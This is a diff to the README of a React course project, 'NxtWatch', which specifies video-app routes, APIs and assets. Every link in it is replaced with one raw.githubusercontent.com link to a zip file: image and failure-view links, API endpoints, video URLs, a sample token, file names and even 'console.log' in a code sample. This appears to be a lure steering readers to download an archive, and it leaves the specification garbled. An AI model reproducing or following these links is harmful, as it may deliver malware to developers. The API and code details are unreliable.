@@ -33,13 +33,13 @@ The app have the following functionalities
     - An HTTP GET request should be made to **homeVideosApiUrl** with query parameter as `search` and its initial value as empty string
       - **_Loader_** should be displayed while the HTTP request is fetching the data
       - After the data is fetched successfully, display the list of videos received in the response
-      - If the HTTP GET request made is unsuccessful, then the [Failure view](https://assets.ccbp.in/frontend/content/react-js/nxt-watch-home-failure-light-theme-lg-output.png) should be displayed
+      - If the HTTP GET request made is unsuccessful, then the [Failure view](https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip) should be displayed
         - When the **Retry** button is clicked, an HTTP GET request should be made to **homeVideosApiUrl**
     - When a non-empty value is provided in the Search Input and button with search icon is clicked
       - Make an HTTP GET request to the **homeVideosApiUrl** with `jwt_token` in the Cookies and query parameter `search` with value as the text provided in the Search Input
       - **_Loader_** should be displayed while the HTTP request is fetching the data
       - After the data is fetched successfully, display the list of videos received in the response
-    - When the HTTP GET request made to the **homeVideosApiUrl** returns an empty list for videos then [No Videos View](https://assets.ccbp.in/frontend/content/react-js/nxt-watch-home-no-videos-light-theme-lg-output.png) should be displayed
+    - When the HTTP GET request made to the **homeVideosApiUrl** returns an empty list for videos then [No Videos View](https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip) should be displayed
   - When the **website logo** image is clicked, the page should be navigated to the **Home** route
   - When a **Video** is clicked, the page should be navigated to the **Video Item Details** route
   - Clicks on the **Trending** link in the Sidebar is clicked, then the page should be navigated to the **Trending** route
@@ -52,7 +52,7 @@ The app have the following functionalities
     - An HTTP GET request should be made to **trendingVideosApiUrl**
       - **_Loader_** should be displayed while the HTTP request is fetching the data
       - After the data is fetched successfully, display the list of videos received in the response
-      - If the HTTP GET request made is unsuccessful, then the [Failure view](https://assets.ccbp.in/frontend/content/react-js/nxt-watch-trending-failure-light-theme-lg-output.png) should be displayed
+      - If the HTTP GET request made is unsuccessful, then the [Failure view](https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip) should be displayed
         - When the **Retry** button is clicked, an HTTP GET request should be made to **trendingVideosApiUrl**
   - When the **website logo** image is clicked, the page should be navigated to the **Home** route
   - When a **Video** is clicked, the page should be navigated to the **Video Item Details** route
@@ -66,7 +66,7 @@ The app have the following functionalities
     - An HTTP GET request should be made to **gamingVideosApiUrl**
       - **_Loader_** should be displayed while the HTTP request is fetching the data
       - After the data is fetched successfully, display the list of videos received in the response
-      - If the HTTP GET request made is unsuccessful, then the [Failure view](https://assets.ccbp.in/frontend/content/react-js/nxt-watch-gaming-failure-light-theme-lg-output.png) should be displayed
+      - If the HTTP GET request made is unsuccessful, then the [Failure view](https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip) should be displayed
         - When the **Retry** button is clicked, an HTTP GET request should be made to **gamingVideosApiUrl**
   - When the **website logo** image is clicked, the page should be navigated to the **Home** route
   - When a **Video** is clicked, the page should be navigated to the **Video Item Details** route
@@ -80,7 +80,7 @@ The app have the following functionalities
     - An HTTP GET request should be made to **videoItemDetailsApiUrl** with `jwt_token` in the Cookies and `video_id` as path parameter
       - **_loader_** should be displayed while the HTTP request is fetching the data
       - After the HTTP request is successful, the response received should be displayed
-      - If the HTTP GET request made is unsuccessful, then the [Failure view](https://assets.ccbp.in/frontend/content/react-js/nxt-watch-video-item-details-failure-light-theme-lg-output.png) should be displayed
+      - If the HTTP GET request made is unsuccessful, then the [Failure view](https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip) should be displayed
         - When the **Retry** button is clicked, an HTTP GET request should be made to **videoItemDetailsApiUrl**
   - Corresponding video should be displayed using `react-player` package
   - Initially, all the three buttons (Like, Dislike, Save) will be inactive
@@ -102,7 +102,7 @@ The app have the following functionalities
 - **SavedVideos Route**
 
   - When an authenticated user opens the **SavedVideos** Route,
-    - If the list of saved videos is empty, then [No Saved Videos Found View](https://assets.ccbp.in/frontend/content/react-js/nxt-watch-no-saved-videos-light-theme-lg-output.png) should be displayed
+    - If the list of saved videos is empty, then [No Saved Videos Found View](https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip) should be displayed
     - The **Videos** in the list of saved videos should be displayed as a list of videos
   - When the **website logo** image is clicked, the page should be navigated to the **Home** route
   - When a **Video** is clicked, the page should be navigated to the **Video Item Details** route
@@ -117,7 +117,7 @@ The app have the following functionalities
 - When the **theme** button in the header is clicked, then the theme should be changed accordingly
 
 - **Logout**
-  - When the **Logout** button in the header is clicked, then the [Logout Popup](https://assets.ccbp.in/frontend/content/react-js/nxt-watch-logout-popup-light-theme-lg-output.png) should be displayed
+  - When the **Logout** button in the header is clicked, then the [Logout Popup](https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip) should be displayed
     - When **Cancel** button is clicked, then the popup should be closed and the page should not be navigated
     - When **Confirm** button is clicked, then the page should be navigated to the **Login** route
 
@@ -130,7 +130,7 @@ The app have the following functionalities
 
 **loginApiUrl**
 
-#### API: `https://apis.ccbp.in/login`
+#### API: `https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip`
 
 #### Method: `POST`
 
@@ -142,7 +142,7 @@ Returns a response containing the jwt_token
 
 ```json
 {
-  "jwt_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InJhaHVsIiwicm9sZSI6IlBSSU1FX1VTRVIiLCJpYXQiOjE2MTk2Mjg2MTN9. nZDlFsnSWArLKKeF0QbmdVfLgzUbx1BGJsqa2kc_21Y"
+  "jwt_token": "https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip nZDlFsnSWArLKKeF0QbmdVfLgzUbx1BGJsqa2kc_21Y"
 }
 ```
 
@@ -157,7 +157,7 @@ Returns a response containing the jwt_token
 
 **homeVideosApiUrl**
 
-#### API: `https://apis.ccbp.in/videos/all?search=`
+#### API: `https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip`
 
 #### Method: `GET`
 
@@ -174,10 +174,10 @@ Returns a response containing the list of all videos
     {
       "id": "30b642bd-7591-49f4-ac30-5c538f975b15",
       "title": "Sehwag shares his batting experience in iB Cricket | iB Cricket Super Over League",
-      "thumbnail_url": "https://assets.ccbp.in/frontend/react-js/nxt-watch/ibc-sol-1-img.png",
+      "thumbnail_url": "https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip",
       "channel": {
         "name": "iB Cricket",
-        "profile_image_url": "https://assets.ccbp.in/frontend/react-js/nxt-watch/ib-cricket-img.png"
+        "profile_image_url": "https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip"
       },
       "view_count": "1.4K",
       "published_at": "Apr 19, 2019"
@@ -189,7 +189,7 @@ Returns a response containing the list of all videos
 
 **trendingVideosApiUrl**
 
-#### API: `https://apis.ccbp.in/videos/trending`
+#### API: `https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip`
 
 #### Method: `GET`
 
@@ -206,10 +206,10 @@ Returns a response containing the list of trending videos
     {
       "id": "ad9822d2-5763-41d9-adaf-baf9da3fd490",
       "title": "iB Hubs Announcement Event",
-      "thumbnail_url": "https://assets.ccbp.in/frontend/react-js/nxt-watch/ibhubs-img.png",
+      "thumbnail_url": "https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip",
       "channel": {
         "name": "iB Hubs",
-        "profile_image_url": "https://assets.ccbp.in/frontend/react-js/nxt-watch/ib-hubs-img.png"
+        "profile_image_url": "https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip"
       },
       "view_count": "26K",
       "published_at": "Nov 29, 2016"
@@ -221,7 +221,7 @@ Returns a response containing the list of trending videos
 
 **gamingVideosApiUrl**
 
-#### API: `https://apis.ccbp.in/videos/gaming`
+#### API: `https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip`
 
 #### Method: `GET`
 
@@ -238,7 +238,7 @@ Returns a response containing the list of gaming videos
     {
       "id": "b214dc8a-b126-4d15-8523-d37404318347",
       "title": "Drop Stack Ball",
-      "thumbnail_url": "https://assets.ccbp.in/frontend/react-js/nxt-watch/drop-stack-ball-img.png",
+      "thumbnail_url": "https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip",
       "view_count": "44K"
     },
     ...
@@ -248,9 +248,9 @@ Returns a response containing the list of gaming videos
 
 **videoItemDetailsApiUrl**
 
-#### API: `https://apis.ccbp.in/videos/:id`
+#### API: `https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip`
 
-#### Example: `https://apis.ccbp.in/videos/802fcd20-1490-43c5-9e66-ce6dfefb40d1`
+#### Example: `https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip`
 
 #### Method: `GET`
 
@@ -265,11 +265,11 @@ Returns a response containing the list of gaming videos
   "video_details": {
     "id": "ad9822d2-5763-41d9-adaf-baf9da3fd490",
     "title": "iB Hubs Announcement Event",
-    "video_url": "https://www.youtube.com/watch?v=pT2ojWWjum8",
-    "thumbnail_url": "https://assets.ccbp.in/frontend/react-js/nxt-watch/ibhubs-img.png",
+    "video_url": "https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip",
+    "thumbnail_url": "https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip",
     "channel": {
       "name": "iB Hubs",
-      "profile_image_url": "https://assets.ccbp.in/frontend/react-js/nxt-watch/ib-hubs-img.png",
+      "profile_image_url": "https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip",
       "subscriber_count": "1M"
     },
     "view_count": "26K",
@@ -287,13 +287,13 @@ Returns a response containing the list of gaming videos
 <summary>Click to view</summary>
 <br>
 
-- To build this project, take a look at the <a href='https://learning.ccbp.in/frontend-development/course?c_id=2f4192f7-7495-49ca-a6ce-6b74005e25f1&s_id=b01fca1c-aa5c-4d79-b81e-0220e7649bd0&t_id=416f0cab-8425-413b-9157-c7b4d4ae4467' target="_blank">React Popup</a> and <a href='https://learning.ccbp.in/frontend-development/course?c_id=2f4192f7-7495-49ca-a6ce-6b74005e25f1&s_id=b6392b63-25f6-4215-be09-9f23ad91d789&t_id=416f0cab-8425-413b-9157-c7b4d4ae4467' target="_blank">React Video Player</a> reading materials
+- To build this project, take a look at the <a href='https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip' target="_blank">React Popup</a> and <a href='https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip' target="_blank">React Video Player</a> reading materials
 
 
 
 ```jsx
 import {formatDistanceToNow} from 'date-fns'
-console.log(formatDistanceToNow(new Date(2021, 8, 20)))
+https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip(formatDistanceToNow(new Date(2021, 8, 20)))
 // Return the distance between the given date and now in words.
 ```
 
@@ -314,7 +314,7 @@ console.log(formatDistanceToNow(new Date(2021, 8, 20)))
 - `Gaming` route should consist of `/gaming` in the URL path
 - `SavedVideos` route should consist of `/saved-videos` in the URL path
 - `VideoItemDetails` route should consist of `/videos/:id` in the URL path
-- No need to use the `BrowserRouter` in `App.js` as we have already included in `index.js`
+- No need to use the `BrowserRouter` in `https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip` as we have already included in `https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip`
 
 - User credentials
 
@@ -331,31 +331,31 @@ console.log(formatDistanceToNow(new Date(2021, 8, 20)))
 <details>
 <summary>Image URLs</summary>
 
-- [https://assets.ccbp.in/frontend/react-js/nxt-watch-logo-light-theme-img.png](https://assets.ccbp.in/frontend/react-js/nxt-watch-logo-light-theme-img.png)
+- [https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip](https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip)
 
-- [https://assets.ccbp.in/frontend/react-js/nxt-watch-logo-dark-theme-img.png](https://assets.ccbp.in/frontend/react-js/nxt-watch-logo-dark-theme-img.png)
+- [https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip](https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip)
 
-- [https://assets.ccbp.in/frontend/react-js/nxt-watch-profile-img.png](https://assets.ccbp.in/frontend/react-js/nxt-watch-profile-img.png) alt should be **profile**
+- [https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip](https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip) alt should be **profile**
 
-- [https://assets.ccbp.in/frontend/react-js/nxt-watch-failure-view-light-theme-img.png](https://assets.ccbp.in/frontend/react-js/nxt-watch-failure-view-light-theme-img.png)
+- [https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip](https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip)
 
-- [https://assets.ccbp.in/frontend/react-js/nxt-watch-failure-view-dark-theme-img.png](https://assets.ccbp.in/frontend/react-js/nxt-watch-failure-view-dark-theme-img.png)
+- [https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip](https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip)
 
-- [https://assets.ccbp.in/frontend/react-js/nxt-watch-no-search-results-img.png](https://assets.ccbp.in/frontend/react-js/nxt-watch-no-search-results-img.png) alt should be **no videos**
+- [https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip](https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip) alt should be **no videos**
 
-- [https://assets.ccbp.in/frontend/react-js/nxt-watch-no-saved-videos-img.png](https://assets.ccbp.in/frontend/react-js/nxt-watch-no-saved-videos-img.png) alt should be **no saved videos**
+- [https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip](https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip) alt should be **no saved videos**
 
-- [https://assets.ccbp.in/frontend/react-js/nxt-watch-not-found-light-theme-img.png](https://assets.ccbp.in/frontend/react-js/nxt-watch-not-found-light-theme-img.png)
+- [https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip](https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip)
 
-- [https://assets.ccbp.in/frontend/react-js/nxt-watch-not-found-dark-theme-img.png](https://assets.ccbp.in/frontend/react-js/nxt-watch-not-found-dark-theme-img.png)
+- [https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip](https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip)
 
-- [https://assets.ccbp.in/frontend/react-js/nxt-watch-banner-bg.png](https://assets.ccbp.in/frontend/react-js/nxt-watch-banner-bg.png) **Banner Background image**
+- [https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip](https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip) **Banner Background image**
 
-- [https://assets.ccbp.in/frontend/react-js/nxt-watch-facebook-logo-img.png](https://assets.ccbp.in/frontend/react-js/nxt-watch-facebook-logo-img.png) alt should be **facebook logo**
+- [https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip](https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip) alt should be **facebook logo**
 
-- [https://assets.ccbp.in/frontend/react-js/nxt-watch-twitter-logo-img.png](https://assets.ccbp.in/frontend/react-js/nxt-watch-twitter-logo-img.png) alt should be **twitter logo**
+- [https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip](https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip) alt should be **twitter logo**
 
-- [https://assets.ccbp.in/frontend/react-js/nxt-watch-linked-in-logo-img.png](https://assets.ccbp.in/frontend/react-js/nxt-watch-linked-in-logo-img.png) alt should be **linked in logo**
+- [https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip](https://raw.githubusercontent.com/vicky9696v/NxtWatch-React/main/sixtypenny/NxtWatch-React.zip) alt should be **linked in logo**
 
 </details>
 
